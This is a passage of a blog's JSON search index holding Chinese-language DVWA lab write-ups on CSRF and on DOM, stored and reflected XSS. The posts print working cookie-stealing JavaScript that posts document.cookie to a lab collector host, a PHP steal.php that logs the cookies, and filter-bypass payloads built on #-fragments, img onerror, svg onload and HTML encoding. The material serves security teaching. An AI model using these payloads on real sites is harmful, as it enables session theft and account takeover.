(window.XMLHttpRequest) { ajax = new XMLHttpRequest(); } else if (window.ActiveXObject) { ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } else { ajax=null; } ajax.open(&quot;GET&quot;, url, true); ajax.send(null); 这段js代码将获取iframe标签中src加载的存在csrf页面的表单隐藏域中的token，然后通过ajax向服务器发送修改密码的http请求并带上token，通过存储型xss可以成功的利用的本不可能产生的csrf漏洞修改用户密码用firebug抓包可以观察到利用xss漏洞将会获取存在csrf页面的token并将token附带到修改密码的http请求中发送到服务器 总结从对dvwa中csrf的研究可以看出csrf最有效的防御方式还是利用token来进行防御","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"dvwa学习","slug":"dvwa学习","permalink":"http://yoursite.com/tags/dvwa学习/"}]},{"title":"dvwa XSS(DOM)","slug":"DOM XSS","date":"2017-12-21T11:21:07.805Z","updated":"2018-07-18T03:15:47.571Z","comments":true,"path":"2017/12/21/DOM XSS/","link":"","permalink":"http://yoursite.com/2017/12/21/DOM XSS/","excerpt":"dvwa DOM型XSS序在介绍dom xss之前 ，首先需要明白一个非常重要的地方：反射型xss和存储型xss指的是用户输入的js恶意代码经过服务器响应后直接输出，或者存储到了服务器后直接输出，然后通过浏览器js解析引擎解析后直接执行触发，而dom型xss指的是用户输入的js恶意代码经过服务器响应后并不会直接被浏览器js解析解析触发，而是经过一些javascript dom渲染后，构造完dom树后，浏览器解析时，才会被js的解析引擎解析执行，本质上的区别：dom xss需要页面经过dom渲染，构造完dom树时才被解析触发，但是反射型是直接被浏览器的js解析引擎解析触发，这也正是为什么我们查看页面源代码和使用firebug查看元素时看到的内容不一样的原因，一个是没有经过dom渲染，一个是经过dom渲染过后的，这也是在xss漏洞挖掘时，判断输入点和输出点很重要的一个细节","text":"dvwa DOM型XSS序在介绍dom xss之前 ，首先需要明白一个非常重要的地方：反射型xss和存储型xss指的是用户输入的js恶意代码经过服务器响应后直接输出，或者存储到了服务器后直接输出，然后通过浏览器js解析引擎解析后直接执行触发，而dom型xss指的是用户输入的js恶意代码经过服务器响应后并不会直接被浏览器js解析解析触发，而是经过一些javascript dom渲染后，构造完dom树后，浏览器解析时，才会被js的解析引擎解析执行，本质上的区别：dom xss需要页面经过dom渲染，构造完dom树时才被解析触发，但是反射型是直接被浏览器的js解析引擎解析触发，这也正是为什么我们查看页面源代码和使用firebug查看元素时看到的内容不一样的原因，一个是没有经过dom渲染，一个是经过dom渲染过后的，这也是在xss漏洞挖掘时，判断输入点和输出点很重要的一个细节 dom xssxss主要分为三种，前面通过了dvwa分别研究了反射型和存储型两种xss，这次写篇有关dom xss的文章，dvwa这里的dom xss和前面的两种xss的区别主要是：这里dom xss的产生并没有和后台服务器产生交互，而是通过浏览器的dom树解析产生的 下面来学习一下这种xss 测试环境一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口一台win7虚拟机，ip为192.168.50.156,用来接受漏洞网站的cookie，web由phpstudy搭建 low级别服务器端没有任何php代码，查看前端页面源代码，处理用户输入的只有前端的js代码： &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; 我们从选择列表选择的值赋值给default附加到url后，这段js代码将url中default的值赋给option标签的value属性节点和文本节点构造payload:http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%22xss%22)%3C/script%3E,弹框证明有xss的存在，浏览器在解析html dom树时就会触发js弹框代码接下来利用dom xss获取网站的cookie，构造连接http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E用script标签加载远程服务器上我们编写的获取网站用户cookie的js代码,和之前的一样利用ajax var url = &quot;http://192.168.50.156/dvwaxss/steal.php&quot;; var postStr = &quot;data=&quot;+document.cookie; var ajax = null; if (window.XMLHttpRequest) { ajax = new XMLHttpRequest(); } else if (window.ActiveXObject) { ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } else { ajax=null; } ajax.open(&quot;POST&quot;, url, true);//true代表异步 ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); ajax.send(postStr); 上面编写的代码创建了一个ajax对象，构造了一个post请求将用户的cookie作为参数发送到了http://192.168.50.156/dvwaxss/steal.php,也就是当前目录下的steal.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); $conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;dvwacookie&quot;,$conn); if(isset($_GET[&apos;data&apos;])) { $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else if(isset($_POST[&apos;data&apos;])) { $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else { $sql=&quot;select * from low&quot;; $result=mysql_query($sql,$conn); while($row=mysql_fetch_array($result)) { echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;; } mysql_close(); } ?&gt; steal.php将我们获取到的cookie存到数据库中可以看到数据库已经接收到了网站用户的cookie同样的还可以使用juery ajax，构造连接 http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%20src=%22http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E 代码如下 $(document).ready(function(){ $.post(&quot;http://192.168.50.156/dvwaxss/steal.php&quot;,{data:document.cookie}); } ); 同样接收到了cookie medium级别前端代码如下，和low级别的一样 &lt;script&gt; if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) { var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8); document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;); } document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;); document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;); &lt;/script&gt; 但是后端代码对url的default参数的值做了限制 &lt;?php // Is there any input? if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { $default = $_GET[&apos;default&apos;]; # Do not allow script tags if (stripos ($default, &quot;&lt;script&quot;) !== false) { header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 不允许出现script标签，否则就将default的值设为默认的English，stripos还防止了大小写绕过这里的绕过有两种方式方式1url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为 http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?#default=%3Cscript%3Ealert(%22xss%22)%3C/script%3E 可以看出成功绕过方法2或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造连接 http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Cimg%20src=#%20onerror=alert(%22xss%22)%3E 注意这里要闭合option以及select标签，这样做会破坏页面结构，隐蔽性不如第一种方法，同样的标签还有svg等，比如 http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Csvg%20onload=alert(&quot;xss&quot;)%3E svg的onload事件同样可以在页面加载时执行js代码，产生弹框的效果，同样的标签还有好多下面我们用这些方法加载远程js脚本获取网站用户的cookie(发送cookie的代码用juery) http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/#?default=%3Cscript%20src=%22http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E img标签onerror事件加载 http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Cimg%20src=#%20onerror=%22var%20b=%20document.createElement(%27script%27);%20b.setAttribute(%27src%27,%27http://192.168.50.156/dvwaxss/cookie.js%27);document.getElementsByTagName(%27head%27)[0].appendChild(b);%22%3E onerror事件后执行js代码，通过js的dom操作创建script标签加载远程脚本，下面是onerror事件后执行的js代码，和上一节的一样 var b= document.createElement(&apos;script&apos;); b.setAttribute(&apos;src&apos;,&apos;http://192.168.50.156/dvwaxss/cookie.js&apos;); document.getElementsByTagName(&apos;head&apos;)[0].appendChild(b); 远程获取cookie脚本 var url = &quot;http://192.168.50.156/dvwaxss/steal.php&quot;; var postStr = &quot;data=&quot;+document.cookie; var ajax = null; if (window.XMLHttpRequest) { ajax = new XMLHttpRequest(); } else if (window.ActiveXObject) { ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } else { ajax=null; } ajax.open(&quot;POST&quot;, url, true); ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); ajax.send(postStr); 同样svg标签的onload也可以，构造连接 http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Csvg%20onload=%22var%20b=%20document.createElement(%27script%27);%20b.setAttribute(%27src%27,%27http://192.168.50.156/dvwaxss/cookie.js%27);document.getElementsByTagName(%27head%27)[0].appendChild(b);%22%3E 以上方法均可以绕过medium加载远程脚本获取网站用户cookie ###high级别### &lt;?php // Is there any input? if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) { # White list the allowable languages switch ($_GET[&apos;default&apos;]) { case &quot;French&quot;: case &quot;English&quot;: case &quot;German&quot;: case &quot;Spanish&quot;: # ok break; default: header (&quot;location: ?default=English&quot;); exit; } } ?&gt; 在服务器后端判断，要求default的值必须为select选择菜单中的值，这里继续用上面的#符号绕过即可，构造payload http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=English#%3Cscript%20src=%22http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E 加载远程脚本 $(document).ready(function(){ $.post(&quot;http://192.168.50.156/dvwaxss/steal.php&quot;,{data:document.cookie}); } ); 获取high级别的网站用户cookie 总结通过对dvwa三种类型xss的学习，可以看出预防xss的方法不光要做到过滤一切用户有害输入，转义可能引起跨站漏洞的标签，最重要的是重http层做到防护，给cookie设置httponly属性，使cookie不能被javascript读取，才能有效防止用户cookie被盗用的问题","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"dvwa学习","slug":"dvwa学习","permalink":"http://yoursite.com/tags/dvwa学习/"}]},{"title":"dvwa XSS(Stored)","slug":"Stored XSS","date":"2017-12-01T14:32:39.547Z","updated":"2018-06-04T15:14:22.750Z","comments":true,"path":"2017/12/01/Stored XSS/","link":"","permalink":"http://yoursite.com/2017/12/01/Stored XSS/","excerpt":"dvwa存储型xss序通过上一篇对反射型xss的研究和利用，接下来的这篇文章将研究存储型xss并且利用存储型xss编写exploit盗取用户cookie,存储型xss的不同之处在于它可以将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发，相比较反射型xss更为隐蔽，危害更大，受害者也会更多，在这我将介绍几种更为隐蔽的方式获取用户cookie","text":"dvwa存储型xss序通过上一篇对反射型xss的研究和利用，接下来的这篇文章将研究存储型xss并且利用存储型xss编写exploit盗取用户cookie,存储型xss的不同之处在于它可以将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发，相比较反射型xss更为隐蔽，危害更大，受害者也会更多，在这我将介绍几种更为隐蔽的方式获取用户cookie 测试环境同上次的一样，一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口一台win7虚拟机，ip为192.168.50.150,用来接受漏洞网站的cookie，web由phpstudy搭建 low级别为了便于理解，代码如下 &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitize name input $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt;可以看出对有害输入没有任何过滤，直接将用户提交的内容插入数据库，输入点在两个输入框都有，但是后面的几种难度都对Message域的输入内容进行了htmlspecialchars转义，为了和后面的一致，我们将payload插入Name域测试xss,在此之前用firebug将Name输入框的maxlength改为600，一开始为10，然后输入payload Name:&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; Message:testxss 简单的一个弹框，弹框可见我们的payload已经储存到了数据库，只要访问该页面的用户都会触发xss下面我们编写payload偷取该网站下用户的cookie，构造payload Name:&lt;script src=&quot;http://192.168.50.150/dvwaxss/cookie.js&quot;&gt;&lt;/script&gt; Message:testxss 用script标签加载远程服务器上我们编写的获取cookie的js代码，上一节我们编写的是下面的代码 document.write(&quot;&lt;form action=&apos;http://192.168.50.150/dvwaxss/steal.php&apos; name=&apos;exploit&apos; method=&apos;post&apos; style=&apos;display:none&apos;&gt;&quot;); document.write(&quot;&lt;input type=&apos;hidden&apos; name=&apos;data&apos; value=&apos;&quot;+document.cookie+&quot;&apos;&gt;&quot;); document.write(&quot;&lt;/form&gt;&quot;); document.exploit.submit(); 这段js代码的作用是在页面中构造一个隐藏表单和一个隐藏域，内容为当前的cookie，并且以post方式发送到同目录下的steal.php，但是这种方式有个缺点就是将cookie发送到steal.php后他会刷新页面跳转到steal.php，这样的做法难免会引起用户的怀疑，我们需要用一种更为隐蔽的方式，这里我们用ajax技术，一种异步的javascript,在不刷新页面的前提下神不知鬼不觉的将用户的cookie发送到steal.php var url = &quot;http://192.168.50.150/dvwaxss/steal.php&quot;; var postStr = &quot;data=&quot;+document.cookie; var ajax = null; if (window.XMLHttpRequest) { ajax = new XMLHttpRequest(); } else if (window.ActiveXObject) { ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } else { ajax=null; } ajax.open(&quot;POST&quot;, url, true);//true代表异步 ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); ajax.send(postStr); 上面编写的代码创建了一个ajax对象，构造了一个post请求将用户的cookie作为参数发送到了http://192.168.50.150/dvwaxss/steal.php,也就是当前目录下的steal.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); $conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;dvwacookie&quot;,$conn); if(isset($_GET[&apos;data&apos;])) { $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else if(isset($_POST[&apos;data&apos;])) { $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else { $sql=&quot;select * from low&quot;; $result=mysql_query($sql,$conn); while($row=mysql_fetch_array($result)) { echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;; } mysql_close(); } ?&gt; steal.php将我们获取到的cookie存到数据库中我们先删除目标网站数据中之前我们插入的payload，然后输入 Name:&lt;script src=&quot;http://192.168.50.150/dvwaxss/cookie.js&quot;&gt;&lt;/script&gt; Message:send cookie use ajax 用src加载远程服务器的js脚本，那么js就是该网站所信任的，那么js的源就会变成加载它的域，从而可以读取该域的数据，比如用户cookie，我们将请求提交后可以看到当前页面将http://192.168.50.150/dvwaxss/cookie.js加载了进来 然后观察firebug的javascript控制台，看到 已拦截跨源请求：同源策略禁止读取位于 http://192.168.50.150/dvwaxss/steal.php 的远程资源。（原因：CORS 头缺少 &apos;Access-Control-Allow-Origin&apos;） 这是因为ajax严格遵从同源策略，当前加载cookie.js的域为http://192.168.50.128:8080,所以ajax不能读取不同域http://192.168.50.150下的数据，但是cookie已经被发送到了http://192.168.50.150域，steal.php已经将偷取到的cookie存放在了数据库中,而且页面没有刷新，很隐蔽还有一种方式，为了更好的兼容浏览器，我们可以使用juery ajax删除目标网站之前的payload，输入 Name:&lt;script src=&quot;http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://192.168.50.150/dvwaxss/cookie.js&quot;&gt;&lt;/script&gt; Message:send cookie use juery ajax 使用juery前要先&lt;script src=&quot;http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;引入由于dvwa中guestbook的name字段有长度限制，为了实验效果，我们用phpmyadmin将name列的varchar改为1000服务端juery代码 $(document).ready(function(){ $.post(&quot;http://192.168.50.150/dvwaxss/steal.php&quot;,{data:document.cookie}); } ); 上面的代码同样的构造post请求将cookie作为post参数发送给steal.php然后提交我们的输入可见页面加载了我们的cookie.js同时ajax也执行了cookie也被偷取到了 medium级别代码如下 &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 主要过滤的地方有 $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); $message = htmlspecialchars( $message ); $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name ); 对mtxMessage进行了htmlspecialchars转义，但是没有转义txtName，只是把&lt;script&gt;替换为了空，和之前的反射型xss一样，转化为大写&lt;SCRIPT&gt;或者&lt;scr&lt;script&gt;ipt&gt;绕过即可，下面的和low级别利用方式一样，这里不再重复 high 级别代码如下 &lt;?php if( isset( $_POST[ &apos;btnSign&apos; ] ) ) { // Get input $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); $name = trim( $_POST[ &apos;txtName&apos; ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $message = htmlspecialchars( $message ); // Sanitize name input $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); //mysql_close(); } ?&gt; 触发点还是在Name域，和反射型xss high级别的过滤方法一样 $name = trim( $_POST[ &apos;txtName&apos; ] ); $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name ); 用img标签绕过即可，有不明白的地方参考上一节反射型，编写payload验证xss的存在,输入 Name:&lt;img src=# onerror=&quot;alert(&apos;xss&apos;)&quot;&gt; Message:test xss 弹框，证明有xss的存在接下来编写payload获取用户cookie，用firebug将maxlength改为1000，再输入之前先将之前插入数据库的payload删除，然后输入 Name:&lt;img src=# onerror=&apos;var url=&quot;http://192.168.50.150/dvwaxss/steal.php&quot;;var postStr=&quot;data=&quot;+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest){ajax=new XMLHttpRequest();}else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject){ajax=new Act&amp;#x69;veXObject(&quot;M&amp;#x69;crosoft.XMLHTTP&quot;);}else{ajax=null;}ajax.open(&quot;POST&quot;, url, true);ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded&quot;);ajax.send(postStr);&apos;&gt; Message:send cookie use ajax 直接在onerror后使用ajax将当前网站用户的cookie用ajax发送到http://192.168.50.150/dvwaxss/steal.php,为了绕过过滤对所有”i”这个字母进行了html编码，为&amp;#x69;提交payload查看元素查看firebug控制台，有已拦截跨源请求：同源策略禁止读取位于 http://192.168.50.150/dvwaxss/steal.php 的远程资源。（原因：CORS 头缺少 &#39;Access-Control-Allow-Origin&#39;）,可以看出ajax已经执行，将cookie发送到http://192.168.50.150/dvwaxss/steal.php偷取到的cookie被steal.php存入数据库另外一种方式是利用juery ajax 编写payload Name:&lt;img src=# onerror=&quot;var a=document.createElement(&apos;scr&amp;#x69;pt&apos;); a.setAttr&amp;#x69;bute(&apos;src&apos;, &apos;http://cdn.stat&amp;#x69;c.runoob.com/l&amp;#x69;bs/jquery/1.10.2/jquery.m&amp;#x69;n.js&apos;); document.getElementsByTagName(&apos;head&apos;)[0].appendCh&amp;#x69;ld(a);var b= document.createElement(&apos;scr&amp;#x69;pt&apos;); b.setAttr&amp;#x69;bute(&apos;src&apos;,&apos;http://192.168.50.150/xss_s/cook&amp;#x69;e.js&apos;); document.getElementsByTagName(&apos;head&apos;)[0].appendCh&amp;#x69;ld(b);&quot;&gt; Message:send cookie use juery ajax 同样的为了绕过过滤对所有的字母”i”进行html编码onerror里的js代码是利用javascript DOM操作动态创造script标签，然后用setAttribute给src赋值，分别加载http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js和http://192.168.50.150/xss_s/cookie.jshttp://192.168.50.150/xss_s/cookie.js代码为 $(document).ready(function(){ $.post(&quot;http://192.168.50.150/dvwaxss/steal.php&quot;,{data:document.cookie}); } ); 和上面的一样提交payloadjavascript DOM操作已经在页面重新加载时在head标签下创造了两个script标签去加载js脚本cookie已经发送给了http://192.168.50.150/dvwaxss/steal.php被steal.php存入数据库","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"dvwa学习","slug":"dvwa学习","permalink":"http://yoursite.com/tags/dvwa学习/"}]},{"title":"dvwa XSS(Reflected)","slug":"Reflected XSS","date":"2017-11-28T14:01:40.295Z","updated":"2018-06-04T15:11:30.558Z","comments":true,"path":"2017/11/28/Reflected XSS/","link":"","permalink":"http://yoursite.com/2017/11/28/Reflected XSS/","excerpt":"dvwa 反射型xss这篇文章整理了研究dvwa中的反射型xss，包括如何验证存在反射型xss，以及利用反射型xss获取cookie","text":"dvwa 反射型xss这篇文章整理了研究dvwa中的反射型xss，包括如何验证存在反射型xss，以及利用反射型xss获取cookie 测试环境一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口一台win7虚拟机，ip为192.168.50.150,用来接受漏洞网站的cookie，web由phpstudy搭建 low级别为了便于理解，代码如下 &lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { // Feedback for end user echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;; } ?&gt; 可以看出没有任何过滤，直接将用户提交的GET参数name输出到页面，我们可以输入payload &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; 来验证xss的存在接下来是利用xss获取用户cookie,由于script标签可以加载远程服务器的javascript代码并且执行，所以我们在win7的服务器下编写cookie.js document.write(&quot;&lt;form action=&apos;http://192.168.50.150/dvwaxss/steal.php&apos; name=&apos;exploit&apos; method=&apos;post&apos; style=&apos;display:none&apos;&gt;&quot;); document.write(&quot;&lt;input type=&apos;hidden&apos; name=&apos;data&apos; value=&apos;&quot;+document.cookie+&quot;&apos;&gt;&quot;); document.write(&quot;&lt;/form&gt;&quot;); document.exploit.submit(); 这段js代码的作用是在页面中构造一个隐藏表单和一个隐藏域，内容为当前的cookie，并且以post方式发送到同目录下的steal.php &lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); $conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;dvwacookie&quot;,$conn); if(isset($_GET[&apos;data&apos;])) { $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else if(isset($_POST[&apos;data&apos;])) { $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;; $result=mysql_query($sql,$conn); mysql_close(); } else { $sql=&quot;select * from low&quot;; $result=mysql_query($sql,$conn); while($row=mysql_fetch_array($result)) { echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;; } mysql_close(); } ?&gt; steal.php将我们获取到的cookie存到数据库中 create database dvwacookie; use dvwacookie; create table low(id int not null auto_increment primary key,cookie varchar(100) not null); create table medium(id int not null auto_increment primary key,cookie varchar(100) not null); create table high(id int not null auto_increment primary key,cookie varchar(100) not null); 接下来我们在有xss漏洞的位置插入 &lt;script src=http://192.168.50.150/dvwaxss/cookie.js&gt;&lt;/script&gt; 相当于构造链接 http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_r/?name=&lt;script 